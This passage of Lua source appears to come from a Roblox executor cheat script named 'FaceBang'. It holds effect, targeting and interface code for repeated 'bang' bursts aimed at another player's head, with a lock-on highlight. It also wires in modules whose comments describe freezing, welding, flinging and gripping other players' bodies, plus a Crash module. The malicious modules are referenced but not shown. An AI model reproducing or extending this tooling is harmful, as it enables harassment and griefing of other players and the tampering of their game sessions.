			gui.LightInfluence = 0
			gui.MaxDistance = 500
			gui.Adornee = host
			gui.Parent = host

			local big = Instance.new("TextLabel")
			big.Name = "Big"
			big.BackgroundTransparency = 1
			big.Size = UDim2.new(1, 0, 0.62, 0)
			big.Font = Enum.Font.GothamBlack
			big.TextScaled = true
			big.Text = "BANG!!"
			big.TextColor3 = Color3.fromRGB(255, 255, 255)
			big.TextStrokeTransparency = 0
			big.TextStrokeColor3 = Color3.fromRGB(120, 60, 220)
			big.Parent = gui

			local small = Instance.new("TextLabel")
			small.Name = "Small"
			small.BackgroundTransparency = 1
			small.Position = UDim2.new(0, 0, 0.6, 0)
			small.Size = UDim2.new(1, 0, 0.4, 0)
			small.Font = Enum.Font.GothamBold
			small.TextScaled = true
			small.Text = "x1"
			small.TextColor3 = Color3.fromRGB(214, 180, 255)
			small.TextStrokeTransparency = 0.25
			small.Parent = gui
			return { host = host, gui = gui, big = big, small = small }
		end)
		if not built then
			pcall(function() host:Destroy() end)
			return nil
		end
		return built
	end

	local function placeLabel(pos, hits)
		if Config.FXText == false then return end
		if not state.label or not state.label.host.Parent then
			state.label = makeLabel()
		end
		local l = state.label
		if not l then return end
		l.host.CFrame = CFrame.new(pos)
		l.small.Text = "x" .. tostring(hits or 1)
		l.big.TextTransparency = 0
		l.small.TextTransparency = 0.1
		state.labelT0 = os.clock()
	end

	-- the sound lives for the whole bang and is replayed from the top each pulse
	local function placeSound(pos, style)
		if Config.FXSound == false then return end
		if not state.snd or not state.snd.Parent then
			local host = newPart(pos)
			if not host then return end
			host.Transparency = 1
			host.Size = Vector3.new(0.2, 0.2, 0.2)
			local snd = safe(function()
				local s = Instance.new("Sound")
				s.Name = "FB_Bang"
				s.Volume = 0.85
				s.RollOffMode = Enum.RollOffMode.InverseTapered
				s.Parent = host
				return s
			end)
			if not snd then
				pcall(function() host:Destroy() end)
				return
			end
			state.snd, state.sndHost = snd, host
		end
		local id = SOUND[style] or SOUND.nova
		state.sndHost.CFrame = CFrame.new(pos)
		safe(function()
			if state.snd.SoundId ~= id then state.snd.SoundId = id end
			state.snd.PlaybackSpeed = 0.88 + math.random() * 0.3
			pcall(function() state.snd.TimePosition = 0 end)
			state.snd:Play()
		end)
	end

	-- the label animation, driven by the one update loop that already exists
	-- (see update() below); rows that are turned off mid-bang are honoured there
	local function animateLabel(now)
		local l = state.label
		if not l or not l.host.Parent then return end
		local age = now - (state.labelT0 or 0)
		local t = math.min(1, age / 0.5)
		l.gui.Size = UDim2.fromOffset(220 * (0.7 + t * 0.5), 96 * (0.7 + t * 0.5))
		l.big.TextTransparency = math.min(1, t * 1.35)
		l.small.TextTransparency = math.min(1, t * 1.6)
		l.host.CFrame = CFrame.new(l.host.CFrame.Position + Vector3.new(0, 0.05, 0))
	end

	local function kickCamera(amount)
		if Config.FXShake == false then return end
		state.shake = math.min(1.1, state.shake + (amount or 0.45))
	end

	-------------------------------------------------------------- public bursts
	-- Fire one complete bang at a world position. This is the zero-delay entry
	-- point: Bang() calls it synchronously, before returning to the UI.
	function M.burst(pos, opts)
		opts = opts or {}
		local style = Config.FXStyle or "none"
		--[[
		  "none" is a real style now, not a fallback to nova: FXStyle defaults to
		  it, so a bang is a motion with no picture at all unless you explicitly
		  pick a style. Everything below is skipped, so a none-bang costs one
		  function call and allocates nothing.
		]]
		if style == "none" then return end
		if PALETTE[style] == nil then style = "nova" end
		local scale = Config.FXScale or 1.6
		if type(scale) ~= "number" or scale <= 0 then scale = 1.6 end

		blast(pos, style, scale, opts.count)
		placeLabel(pos, opts.hits)
		placeSound(pos, style)
		kickCamera(opts.shake or (0.22 + 0.1 * scale))

		-- a one-frame white flash in front of the camera, only for the big sizes:
		-- cheap depth cue without touching the camera's CFrame
		if (Config.FXScale or 0) >= 2.4 then
			local pgui = ctx.LP and ctx.LP:FindFirstChildOfClass("PlayerGui")
			if pgui then
				safe(function()
					local g = Instance.new("ScreenGui")
					g.Name = "FB_Flash"
					g.IgnoreGuiInset = true
					g.DisplayOrder = 250
					g.ResetOnSpawn = false
					g.Parent = pgui
					local f = Instance.new("Frame")
					f.Size = UDim2.fromScale(1, 1)
					f.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
					f.BorderSizePixel = 0
					f.BackgroundTransparency = 0.55
					f.Parent = g
					spawn(g, 0.09, function(t)
						f.BackgroundTransparency = 0.55 + t * 0.45
					end, "bang")
				end)
			end
		end
		return true
	end

	--------------------------------------------------------------- bang on target
	local function targetHead(plr)
		local char = plr and plr.Character
		if not char then return nil end
		return char:FindFirstChild("Head") or char:FindFirstChild("HumanoidRootPart") or char.PrimaryPart
	end

	local function ensureMarker(plr)
		-- Highlight follows the target for free (no per-frame write) and is a
		-- better "locked on" cue than a hand-animated outline would be.
		if Config.FXMarker == false then return end
		local char = plr and plr.Character
		if not char then return end
		if state.highlight then pcall(function() state.highlight:Destroy() end) end
		safe(function()
			local h = Instance.new("Highlight")
			h.Name = "FB_Lock"
			h.Adornee = char
			h.FillColor = Color3.fromRGB(150, 95, 255)
			h.OutlineColor = Color3.fromRGB(235, 220, 255)
			h.FillTransparency = 0.78
			h.OutlineTransparency = 0.1
			h.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
			h.Parent = folder()
			state.highlight = h
		end)
	end

	local function clearMarker()
		if state.highlight then
			pcall(function() state.highlight:Destroy() end)
			state.highlight = nil
		end
	end

	function M.startBang(plr)
		state.active = true
		state.target = plr
		state.hits = 0
		local head = targetHead(plr)
		if head then
			-- zero delay: burst now, on this frame
			M.burst(head.CFrame.Position, { hits = 1 })
		end
		state.hits = 1
		state.nextPulse = os.clock() + (Config.FXPulse or 0.12)
		ensureMarker(plr)
		return true
	end

	local function dropReusable()
		if state.label then
			pcall(function() state.label.host:Destroy() end)
			state.label = nil
		end
		if state.sndHost then
			pcall(function() state.sndHost:Destroy() end)
			state.sndHost = nil
			state.snd = nil
		end
	end

	function M.stopBang()
		state.active = false
		state.target = nil
		state.hits = 0
		clearMarker()
		dropReusable()
		-- Drop the bang picture now instead of letting the last burst fade: "stop"
		-- has to visibly stop, and it must leave no FB_FX folder behind.
		for i = #state.live, 1, -1 do
			local e = state.live[i]
			if e.group == "bang" then
				if e.node.Parent then pcall(function() e.node:Destroy() end) end
				table.remove(state.live, i)
			end
		end
		if #state.live == 0 and state.folder then
			pcall(function() state.folder:Destroy() end)
			state.folder = nil
		end
	end

	function M.hits()
		return state.hits
	end

	-- fire one more pulse at the current target, immediately. The loop below calls
	-- this on its own clock; exposing it keeps the zero-delay path testable.
	function M.pulseNow()
		local head = targetHead(state.target)
		if not head then return false end
		state.hits += 1
		M.burst(head.CFrame.Position, { hits = state.hits })
		return true
	end

	function M.isActive()
		return state.active
	end

	--------------------------------------------------------------- fly picture
	local function clearFlyFx()
		for _, inst in ipairs(state.flyFx) do
			pcall(function() inst:Destroy() end)
		end
		table.clear(state.flyFx)
		local cam = Workspace.CurrentCamera
		-- undo our camera roll before handing the camera back
		if cam and state.roll ~= 0 and type(CFrame.Angles) == "function" then
			pcall(function() cam.CFrame = cam.CFrame * CFrame.Angles(0, 0, -state.roll) end)
		end
		state.roll = 0
		if cam and state.baseFov then
			pcall(function() cam.FieldOfView = state.baseFov end)
		end
		state.baseFov = nil
	end

	local function buildFlyFx()
		local char = ctx.LP.Character
		local root = char and char:FindFirstChild("HumanoidRootPart")
		if not root then return end

		safe(function()
			local a0 = Instance.new("Attachment")
			a0.Name = "FB_TrailA"
			a0.Position = Vector3.new(0, 1.2, 0)
			a0.Parent = root
			state.flyFx[#state.flyFx + 1] = a0

			local a1 = Instance.new("Attachment")
			a1.Name = "FB_TrailB"
			a1.Position = Vector3.new(0, -1.6, 0)
			a1.Parent = root
			state.flyFx[#state.flyFx + 1] = a1

			local trail = Instance.new("Trail")
			trail.Name = "FB_Trail"
			trail.Attachment0 = a0
			trail.Attachment1 = a1
			trail.Lifetime = 0.45
			trail.MinLength = 0.2
			trail.WidthScale = seq({ { 0, 1 }, { 0.45, 0.55 }, { 1, 0 } })
			trail.Color = ColorSequence.new({
				ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
				ColorSequenceKeypoint.new(0.35, Color3.fromRGB(150, 95, 255)),
				ColorSequenceKeypoint.new(0.75, Color3.fromRGB(70, 200, 255)),
				ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 10, 40)),
			})
			trail.Transparency = seq({ { 0, 0.1 }, { 0.7, 0.55 }, { 1, 1 } })
			trail.LightEmission = 1
			trail.FaceCamera = true
			trail.Enabled = true
			trail.Parent = root
			state.flyFx[#state.flyFx + 1] = trail

			-- thrust: a cone of spars shooting backwards out of the root
			local thrust = Instance.new("ParticleEmitter")
			thrust.Name = "FB_Thrust"
			thrust.Texture = "rbxasset://textures/particles/sparkles_main.dds"
			thrust.Color = ColorSequence.new(Color3.fromRGB(190, 150, 255), Color3.fromRGB(60, 200, 255))
			thrust.Size = seq({ { 0, 0.5 }, { 1, 0 } })
			thrust.Transparency = seq({ { 0, 0.05 }, { 1, 1 } })
			thrust.Lifetime = range(0.18, 0.38)
			thrust.Speed = range(6, 15)
			thrust.SpreadAngle = Vector2.new(14, 14)
			thrust.Rate = 90
			thrust.EmissionDirection = Enum.EmissionDirection.Back
			thrust.LightEmission = 1
			thrust.LightInfluence = 0
			thrust.Acceleration = Vector3.new(0, 0, 0)
			thrust.Parent = root
			state.flyFx[#state.flyFx + 1] = thrust

			-- aura: slow embers lifting off the body so a hover still reads as
			-- powered rather than as a frozen character
			local aura = Instance.new("ParticleEmitter")
			aura.Name = "FB_Aura"
			aura.Texture = "rbxasset://textures/particles/sparkles_main.dds"
			aura.Color = ColorSequence.new(Color3.fromRGB(90, 60, 160), Color3.fromRGB(200, 240, 255))
			aura.Size = seq({ { 0, 0.28 }, { 1, 0 } })
			aura.Transparency = seq({ { 0, 0.25 }, { 1, 1 } })
			aura.Lifetime = range(0.5, 1.1)
			aura.Speed = range(0.5, 2.5)
			aura.SpreadAngle = Vector2.new(180, 180)
			aura.Rate = 26
			aura.LightEmission = 0.8
			aura.Acceleration = Vector3.new(0, 5, 0)
			aura.Parent = root
			state.flyFx[#state.flyFx + 1] = aura
		end)

		local cam = Workspace.CurrentCamera
		if cam then
			state.baseFov = cam.FieldOfView
		end
	end

	function M.flyStart()
		if Config.FlyFX == false then return end
		clearFlyFx()
		state.fly = true
		buildFlyFx()
		-- launch blast at the feet: the "ignition" of the animation
		local char = ctx.LP.Character
		local root = char and char:FindFirstChild("HumanoidRootPart")
		if root then
			M.burst(root.CFrame.Position, { hits = 0, count = 18, shake = 0.25 })
		end
	end

	function M.flyStop()
		state.fly = false
		clearFlyFx()
	end

	function M.isFlying()
		return state.fly
	end

	-------------------------------------------------------------------- loop
	-- One connection for every picture in this file. dt is real time, not frame
	-- count, so the animation looks the same at 30 and 240 fps.
	local function update()
		local now = os.clock()
		local dt = state.last and (now - state.last) or 0
		state.last = now

		ageEffects(now)
		animateLabel(now)

		-- nothing left to show and no bang running: put the folder away so a
		-- stopped script leaves Workspace exactly as it found it
		if state.folder and #state.live == 0 and not state.active then
			pcall(function() state.folder:Destroy() end)
			state.folder = nil
		end

		-- the next pulse follows the target's head, re-read every frame
		if state.active then
			local head = targetHead(state.target)
			if head then
				if state.highlight and state.highlight.Adornee ~= state.target.Character then
					state.highlight.Adornee = state.target.Character
				end
				if now >= state.nextPulse then
					M.pulseNow()
					state.nextPulse = now + math.max(0.03, Config.FXPulse or 0.12)
				end
			end
		end

		local cam = Workspace.CurrentCamera

		-- camera kick: rotational only, small, and it decays on its own
		if state.shake > 0 then
			state.shake = math.max(0, state.shake - dt * 2.6)
			-- disabling the row must stop the camera being written, even from a kick
			-- that was already in flight
			if Config.FXShake == false then state.shake = 0 end
			if cam and state.shake > 0 and type(CFrame.Angles) == "function" then
				local a = state.shake * state.shake * 0.05
				pcall(function()
					cam.CFrame = cam.CFrame * CFrame.Angles(
						(math.random() - 0.5) * a,
						(math.random() - 0.5) * a,
						(math.random() - 0.5) * a)
				end)
			end
		end

		-- fly animation: bank the camera into the movement, widen the FOV with
		-- speed, and drop a shockwave every few tenths while genuinely moving.
		-- ALL of it is behind Config.FlyFX now: with no VFX the camera must be left
		-- completely alone, because a rolling, FOV-pumping camera is a large part of
		-- what made flying feel wrong.
		if state.fly and Config.FlyFX then
			local char = ctx.LP.Character
			local root = char and char:FindFirstChild("HumanoidRootPart")
			if root and cam then
				local vel = root.AssemblyLinearVelocity or Vector3.zero
				local speed = vel.Magnitude

				if type(CFrame.Angles) == "function" then
					-- undo last frame's roll first so it cannot accumulate
					if state.roll ~= 0 then
						pcall(function() cam.CFrame = cam.CFrame * CFrame.Angles(0, 0, -state.roll) end)
					end
					--[[
					  The bank is a hint, not a barrel roll: it used to reach 0.42 rad
					  (~24 degrees) and made the camera feel like it was fighting the
					  stick during a strafe. A quarter of that reads the same and keeps
					  the horizon usable.
					]]
					local lateral = vel:Dot(cam.CFrame.RightVector)
					local want = math.clamp(-lateral / 420, -0.12, 0.12)
					state.roll = state.roll + (want - state.roll) * math.min(1, dt * 7)
					pcall(function() cam.CFrame = cam.CFrame * CFrame.Angles(0, 0, state.roll) end)
				end

				if state.baseFov then
					-- a 26 degree FOV swing at top speed distorts aiming badly
					local wantFov = state.baseFov + math.clamp(speed / 34, 0, 12)
					cam.FieldOfView = cam.FieldOfView + (wantFov - cam.FieldOfView) * math.min(1, dt * 6)
				end

				if speed > 45 then
					state.trailCd = (state.trailCd or 0) - dt
					if state.trailCd <= 0 then
						state.trailCd = 0.13
						local ring = newPart(root.CFrame.Position)
						if ring then
							ring.Shape = Enum.PartType.Ball
							ring.Color = Color3.fromRGB(120, 180, 255)
							ring.Transparency = 0.4
							ring.Size = Vector3.new(1, 0.12, 1)
							spawn(ring, 0.35, function(t)
								local s = 1 + t * 10
								ring.Size = Vector3.new(s, 0.12, s)
								ring.Transparency = 0.4 + t * 0.6
							end, "fly", true)
						end
					end
				end
			end
		end
	end

	--------------------------------------------------------------------- public
	function M.clear()
		M.stopBang()
		M.flyStop()
		for _, e in ipairs(state.live) do
			if e.node and e.node.Parent then pcall(function() e.node:Destroy() end) end
		end
		table.clear(state.live)
		-- an unload has to leave nothing behind, pool included
		for _, part in ipairs(pool) do
			pcall(function() part:Destroy() end)
		end
		table.clear(pool)
		if state.folder then
			pcall(function() state.folder:Destroy() end)
			state.folder = nil
		end
	end

	function M.start()
		if state.conn then return end
		state.conn = RunService.RenderStepped:Connect(update)
	end

	-- last guarded failure, for tests and for a one-line status message
	function M.lastError()
		return state.lastError, state.errs or 0
	end

	function M.destroy()
		M.clear()
		if state.conn then
			pcall(function() state.conn:Disconnect() end)
			state.conn = nil
		end
	end

	M.start()
	return M
end

		return FX
	end)()

	-- ==========================================================================
	-- interface: tabbed panel, adaptive for PC and touch
	-- ==========================================================================
	--[[
	  Palette. Shifted from "dark purple app" to "cold HUD": the surfaces stay
	  near-black so the glass window reads as a sheet of dark glass over the
	  backdrop, and the accent is a cyan-violet pair rather than one hue, which is
	  what keeps a futuristic UI from looking flat.
	]]
	local Theme = {
		bg = Color3.fromRGB(7, 7, 12),
		panel = Color3.fromRGB(13, 13, 20),
		surface = Color3.fromRGB(20, 20, 30),
		surfaceHi = Color3.fromRGB(29, 29, 43),
		surfacePress = Color3.fromRGB(36, 32, 58),
		hair = Color3.fromRGB(44, 46, 66),
		accent = Color3.fromRGB(124, 92, 255),
		accent2 = Color3.fromRGB(64, 220, 255),
		accentSoft = Color3.fromRGB(46, 40, 82),
		text = Color3.fromRGB(236, 240, 250),
		dim = Color3.fromRGB(142, 148, 172),
		faint = Color3.fromRGB(98, 104, 128),
		good = Color3.fromRGB(52, 220, 176),
		bad = Color3.fromRGB(255, 106, 118),
	}
	local Font = Enum.Font.Gotham

	local BASE_W, BASE_H = 312, 492

	-- context object shared with the modules
	local ctx = {
		Players = Players,
		RunService = RunService,
		UserInput = UserInput,
		UIS = UserInput,
		TweenService = TweenService,
		Lighting = game:GetService("Lighting"),
		Workspace = Workspace,
		LP = LP,
		Config = Config,
		notify = notify,
		out = out,
	}

	local Targets = TargetsLib.new(ctx)
	local SelfTools = SelfLib.new(ctx)
	local FX = FXLib.new(ctx)
	local Grip = GripLib.new(ctx)
	local Crash = CrashLib.new(ctx)
	local Poses = PosesLib.new(ctx)
	local Tools = ToolsLib.new(ctx)
	ctx.Targets = Targets
	ctx.SelfTools = SelfTools
	ctx.FX = FX
	ctx.Grip = Grip
	ctx.Crash = Crash
	ctx.Poses = Poses
	ctx.Tools = Tools
	-- the engine looks this up instead of naming the module (modules are built
	-- after core.lua, so a direct name would resolve to a global - see Engine.stop)
	Engine.fx = FX

	-- stopping must not leave a local freeze or weld on the target's body;
	-- this hook is what Engine.stop calls (see the note there)
	Engine.onStop = function()
		pcall(function() Targets.thawAll() end)
		pcall(function() Targets.unweld() end)
		pcall(function() Targets.unfling() end)
		-- a grip is deliberately NOT released here: it is its own row with its own
		-- stop, and binding it to the bang would mean stopping the bang silently
		-- let every held player walk again
	end

	local function corner(obj, r)
		local c = Instance.new("UICorner")
		c.CornerRadius = UDim.new(0, r or 8)
		c.Parent = obj
		return c
	end

	local function new(class, props, parent)
		local o = Instance.new(class)
		for k, v in pairs(props) do o[k] = v end
		o.Parent = parent
		return o
	end

	local function stroke(obj, color, thick, alpha)
		return new("UIStroke", {
			Color = color or Theme.hair,
			Thickness = thick or 1,
			Transparency = alpha or 0,
			ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
		}, obj)
	end

	-- a 2px bar used as a section marker, so labels read as grouped
	local function bar(parent, color)
		local b = new("Frame", {
			Size = UDim2.fromOffset(2, 9),
			BackgroundColor3 = color,
			BorderSizePixel = 0,
		}, parent)
		corner(b, 1)
		return b
	end

	local tweens = {}
	local function tweenObj(obj, prop, goal, time)
		tweens[obj] = (tweens[obj] or 0) + 1
		local key = tweens[obj]
		local t = TweenService:Create(obj, TweenInfo.new(time or 0.12, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { [prop] = goal })
		t:Play()
		t.Completed:Connect(function()
			if tweens[obj] == key then tweens[obj] = nil end
		end)
	end

	local function viewport()
		local cam = Workspace.CurrentCamera
		if cam and cam.ViewportSize.X > 0 then return cam.ViewportSize end
		return Vector2.new(1280, 720)
	end

	local pool = {}
	local conns = {}

	------------------------------------------------------------------- backdrop
	--[[
	  The visual layer behind the panel.

	  WHAT ROBLOX CAN AND CANNOT DO (measured, not assumed)
	  - ImageLabel with an rbxassetid:      YES, this is the supported path.
	  - VideoFrame with an rbxassetid:      YES, but only video YOU uploaded to
	                                        Roblox and that passed moderation.
	  - A YouTube URL / embed:              NO. There is no web player in Roblox
	                                        and no executor API can add one.
	  - Streaming that video's audio:       NO, and it is someone else's song.

	  So this module draws the backdrop itself (gradients + drifting glow + grid +
	  vignette + scanlines), which needs no upload and cannot be moderated away,
	  and offers three optional hooks for your own uploaded assets:
	      Config.BG_ImageId   an rbxassetid image, blurred and dimmed behind the UI
	      Config.BG_VideoId   an rbxassetid video, same treatment
	      Config.MusicId      an rbxassetid Sound for the panel music
	  Set any of them to "" to fall back to the drawn backdrop.

	  BLUR
	  Roblox has no real gaussian blur on plain GuiObjects. What actually reads as
	  blurred is three stacked ImageLabels at increasing scale and decreasing
	  transparency, which smears the source image's edges - that is what bgBlur
	  builds, and it is also why the image is scaled beyond the panel bounds
	  (so the smear never shows a hard clipped edge).
	]]
	local Bg = {}
	local bgLayer, bgImage, bgVideo, bgBlurFrames = {}, nil, nil, {}
	local music, musicConn = nil, nil
	local bgPaused = false
	local bgTween = nil
	local bgDrift = 0

	Bg.muted = false
	Bg.volume = 0.35

	-- three-pass smear: each pass is a bigger, fainter copy of the one before
	local function buildBlur(parent, imageId)
		for _, f in ipairs(bgBlurFrames) do
			if f.Destroy then pcall(function() f:Destroy() end) end
		end
		table.clear(bgBlurFrames)
		for i = 1, 3 do
			local img = new("ImageLabel", {
				Name = "Blur" .. i,
				Size = UDim2.new(1, 14 * i, 1, 14 * i),
				Position = UDim2.new(0.5, 0, 0.5, 0),
				AnchorPoint = Vector2.new(0.5, 0.5),
				BackgroundTransparency = 1,
				Image = imageId,
				ImageTransparency = 0.55 + i * 0.12,
				ScaleType = Enum.ScaleType.Crop,
				ZIndex = 1,
			}, parent)
			img.ClipsDescendants = false
			corner(img, 12)
			bgBlurFrames[#bgBlurFrames + 1] = img
		end
	end

	function Bg.build(parentGui)
		local holder = new("Frame", {
			Name = "Backdrop",
			Size = UDim2.fromOffset(BASE_W, BASE_H),
			Position = UDim2.new(0, 24, 0.5, -BASE_H / 2),
			BackgroundColor3 = Theme.bg,
			BorderSizePixel = 0,
			ZIndex = 2,
			ClipsDescendants = true,
		}, parentGui)
		corner(holder, 16)

		-- base wash: near-black with a violet floor, so panels sit on depth
		local wash = new("Frame", {
			Size = UDim2.fromScale(1, 1),
			BackgroundColor3 = Color3.fromRGB(10, 8, 18),
			BorderSizePixel = 0,
			ZIndex = 1,
		}, holder)
		new("UIGradient", {
			Rotation = 112,
			Color = ColorSequence.new({
				ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 14, 40)),
				ColorSequenceKeypoint.new(0.5, Color3.fromRGB(8, 8, 14)),
				ColorSequenceKeypoint.new(1, Color3.fromRGB(4, 10, 20)),
			}),
		}, wash)

		-- drifting light bloom: two soft ellipses on opposite corners, animated
		-- with a sine so the backdrop breathes instead of sitting still
		local bloomA = new("Frame", {
			Size = UDim2.fromOffset(220, 220),
			Position = UDim2.fromOffset(-60, -80),
			BackgroundColor3 = Color3.fromRGB(120, 80, 255),
			BackgroundTransparency = 0.86,
			BorderSizePixel = 0,
			ZIndex = 1,
		}, holder)
		corner(bloomA, 110)
		local bloomB = new("Frame", {
			Size = UDim2.fromOffset(180, 180),
			Position = UDim2.new(1, -120, 1, -140),
			BackgroundColor3 = Color3.fromRGB(40, 200, 255),
			BackgroundTransparency = 0.9,
			BorderSizePixel = 0,
			ZIndex = 1,
		}, holder)
		corner(bloomB, 90)

		-- fine grid, drawn as clips so it reads as a HUD rather than graph paper
		local grid = new("Frame", {
			Size = UDim2.fromScale(1, 1),
			BackgroundTransparency = 1,
			ZIndex = 1,
		}, holder)
		for i = 1, 12 do
			local v = new("Frame", {
				Size = UDim2.new(0, 1, 1, 0),
				Position = UDim2.fromScale(i / 13, 0),
				BackgroundColor3 = Color3.fromRGB(120, 140, 255),
				BackgroundTransparency = 0.94,
				BorderSizePixel = 0,
			}, grid)
			local h = new("Frame", {
				Size = UDim2.new(1, 0, 0, 1),
				Position = UDim2.fromScale(0, i / 13),
				BackgroundColor3 = Color3.fromRGB(120, 140, 255),
				BackgroundTransparency = 0.94,
				BorderSizePixel = 0,
			}, grid)
		end

		-- optional user asset (image or video), blurred behind everything
		local assetHost = new("Frame", {
			Name = "Asset",
			Size = UDim2.fromScale(1, 1),
			BackgroundTransparency = 1,
			ZIndex = 1,
			ClipsDescendants = true,
		}, holder)
		corner(assetHost, 16)
		bgLayer.assetHost = assetHost

		-- dimmer over the asset so text stays readable over a bright picture
		local dim = new("Frame", {
			Size = UDim2.fromScale(1, 1),
			BackgroundColor3 = Color3.fromRGB(6, 6, 12),
			BackgroundTransparency = 0.35,
			BorderSizePixel = 0,
			ZIndex = 2,
		}, holder)
		bgLayer.dim = dim

		-- vignette: four edge gradients darken the border, which is what makes a
		-- flat rectangle look like it has depth
		for _, spec in ipairs({
			{ rot = 0, y = 0, x = 0, w = 1, h = 0.22 },
			{ rot = 180, y = 0.78, x = 0, w = 1, h = 0.22 },
			{ rot = 90, y = 0, x = 0, w = 0.18, h = 1 },
			{ rot = 270, y = 0, x = 0.82, w = 0.18, h = 1 },
		}) do
			local v = new("Frame", {
				Size = UDim2.fromScale(spec.w, spec.h),
				Position = UDim2.fromScale(spec.x, spec.y),
				BackgroundColor3 = Color3.new(0, 0, 0),
				BackgroundTransparency = 0,
				BorderSizePixel = 0,
				ZIndex = 2,
			}, holder)
			new("UIGradient", {
				Rotation = spec.rot,
				Transparency = NumberSequence.new({
					NumberSequenceKeypoint.new(0, 1),
					NumberSequenceKeypoint.new(1, 0.45),
				}),
			}, v)
		end

		bgLayer.holder = holder
		bgLayer.bloomA = bloomA
		bgLayer.bloomB = bloomB
		return holder
	end

	-- apply an uploaded image: blurred smear + sharp copy at low transparency
	function Bg.setImage(id)
		local host = bgLayer.assetHost
		if not host then return false end
		if bgImage then pcall(function() bgImage:Destroy() end) bgImage = nil end
		bgBlurFrames = bgBlurFrames or {}
		for _, f in ipairs(bgBlurFrames) do
			if f.Destroy then pcall(function() f:Destroy() end) end
		end
		table.clear(bgBlurFrames)
		if type(id) ~= "string" or id == "" then
			if bgLayer.dim then bgLayer.dim.BackgroundTransparency = 0.35 end
			return true
		end
		local src = id:match("^rbxassetid://") and id or ("rbxassetid://" .. id)
		buildBlur(host, src)
		bgImage = new("ImageLabel", {
			Name = "Sharp",
			Size = UDim2.fromScale(1, 1),
			BackgroundTransparency = 1,
			Image = src,
			ImageTransparency = 0.35,
			ScaleType = Enum.ScaleType.Crop,
			ZIndex = 1,
		}, host)
		corner(bgImage, 16)
		-- a picture this bright needs a stronger dim under the text
		if bgLayer.dim then bgLayer.dim.BackgroundTransparency = 0.2 end
		return true
	end

	-- apply an uploaded video: VideoFrame with the same dim + pause support
	function Bg.setVideo(id)
		local host = bgLayer.assetHost
		if not host then return false end
		if bgVideo then pcall(function() bgVideo:Destroy() end) bgVideo = nil end
		if type(id) ~= "string" or id == "" then return true end
		local src = id:match("^rbxassetid://") and id or ("rbxassetid://" .. id)
		bgVideo = new("VideoFrame", {
			Name = "Video",
			Size = UDim2.fromScale(1, 1),
			BackgroundTransparency = 1,
			Video = src,
			Looped = true,
			Muted = true,
			Volume = 0,
			ZIndex = 1,
		}, host)
		pcall(function() bgVideo:Play() end)
		if bgLayer.dim then bgLayer.dim.BackgroundTransparency = 0.25 end
		return true
	end

	-- pause / resume the backdrop video
	function Bg.setPaused(paused)
		bgPaused = paused == true
		if bgVideo then
			if bgPaused then pcall(function() bgVideo:Pause() end)
			else pcall(function() bgVideo:Play() end) end
		end
		return bgPaused
	end

	function Bg.paused() return bgPaused end

	-- optional panel music. Roblox Sound needs an uploaded rbxassetid.
	function Bg.setMusic(id)
		if music then
			pcall(function() music:Destroy() end)
			music = nil
		end
		if type(id) ~= "string" or id == "" then return true end
		local src = id:match("^rbxassetid://") and id or ("rbxassetid://" .. id)
		music = new("Sound", {
			Name = "FaceBangMusic",
			SoundId = src,
			Looped = true,
			Volume = Bg.muted and 0 or Bg.volume,
			Playing = true,
		}, parentGui)
		return true
	end

	function Bg.mute(on)
		Bg.muted = on == true
		if music then pcall(function() music.Volume = Bg.muted and 0 or Bg.volume end) end
		if bgVideo then pcall(function() bgVideo.Muted = true end) end -- always muted
		return Bg.muted
	end

	function Bg.setVolume(v)
		Bg.volume = math.clamp(tonumber(v) or Bg.volume, 0, 1)
		if music and not Bg.muted then pcall(function() music.Volume = Bg.volume end) end
	end

	function Bg.stopMusic()
		if music then pcall(function() music:Destroy() end) music = nil end
	end

	-- per-frame drift for the bloom. Cheap: two property writes.
	function Bg.tick(dt)
		if bgPaused then return end
		bgDrift = bgDrift + (dt or 0)
		local a = bgLayer and bgLayer.bloomA
		local b = bgLayer and bgLayer.bloomB
		if a then
			a.Position = UDim2.fromOffset(-60 + math.sin(bgDrift * 0.32) * 18, -80 + math.cos(bgDrift * 0.24) * 14)
		end
		if b then
			b.Position = UDim2.new(1, -120 + math.sin(bgDrift * 0.21 + 2) * 16, 1, -140 + math.cos(bgDrift * 0.29 + 1) * 12)
		end
	end

	ctx.Bg = Bg

	---------------------------------------------------------------------- shell
	local gui = new("ScreenGui", {
		Name = "FaceBangUI",
		ResetOnSpawn = false,
		IgnoreGuiInset = true,
		ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
		DisplayOrder = 200,
	})
	local parentGui = (function()
		if CAP.gethui then
			local ok, h = pcall(ENV.gethui)
			if ok and h then return h end
		end
		return LP:FindFirstChildOfClass("PlayerGui") or LP:WaitForChild("PlayerGui")
	end)()
	gui.Parent = parentGui

	-- two shadow layers: a wide soft one for depth, a tight one for contact
	local shadowFar = new("Frame", {
		Name = "ShadowFar",
		Size = UDim2.fromOffset(BASE_W, BASE_H),
		Position = UDim2.new(0, 30, 0.5, -BASE_H / 2 + 10),
		BackgroundColor3 = Color3.new(0, 0, 0),
		BackgroundTransparency = 0.82,
		BorderSizePixel = 0,
		ZIndex = 0,
	}, gui)
	corner(shadowFar, 20)

	local shadow = new("Frame", {
		Name = "Shadow",
		Size = UDim2.fromOffset(BASE_W, BASE_H),
		Position = UDim2.new(0, 27, 0.5, -BASE_H / 2 + 4),
		BackgroundColor3 = Color3.new(0, 0, 0),
		BackgroundTransparency = 0.5,
		BorderSizePixel = 0,
		ZIndex = 1,
	}, gui)
	corner(shadow, 16)

	Bg.build(gui)
	if type(Config.BG_ImageId) == "string" and Config.BG_ImageId ~= "" then Bg.setImage(Config.BG_ImageId) end
	if type(Config.BG_VideoId) == "string" and Config.BG_VideoId ~= "" then Bg.setVideo(Config.BG_VideoId) end
	if type(Config.MusicId) == "string" and Config.MusicId ~= "" then
		Bg.setMusic(Config.MusicId)
		Bg.mute(Config.MusicMuted == true)
	end

	local win = new("Frame", {
		Name = "Window",
		Size = UDim2.fromOffset(BASE_W, BASE_H),
		Position = UDim2.new(0, 24, 0.5, -BASE_H / 2),
		BackgroundColor3 = Theme.panel,
		BackgroundTransparency = 0.18,
		BorderSizePixel = 0,
		ZIndex = 4,
	}, gui)
	win.AnchorPoint = Vector2.new(0, 0)
	corner(win, 16)
